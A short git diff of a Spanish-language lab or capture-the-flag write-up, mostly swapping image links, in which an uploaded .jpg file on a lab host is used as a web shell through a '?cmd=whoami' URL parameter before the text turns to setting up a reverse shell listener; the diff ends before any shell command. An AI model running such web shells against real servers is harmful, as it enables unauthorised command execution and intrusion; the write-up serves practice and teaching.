@@ -49,8 +49,9 @@ vemos que se subió
 ![image](https://github.com/user-attachments/assets/1e4b7b39-2209-4d3e-97da-5376f04cf198)
 
  presionamos el archivo que nos muestra y veremos que no hay nada pero en la URL la modificamos para que quede así:
-> 172.17.0.2/themes/uploads/675712b70a259.jpg?cmd=whoami
-![[comprobando.png]]
+ 172.17.0.2/themes/uploads/675712b70a259.jpg?cmd=whoami
+
+![image](https://github.com/user-attachments/assets/22fedb8d-23f2-4bda-804c-dccda91b64da)
 
 nos mostrara "www-data" o sea que la vulnerabilidad esta, así que modificamos la terminal con una bash y colocamos el terminal en escucha
 dejamos la terminal asi:
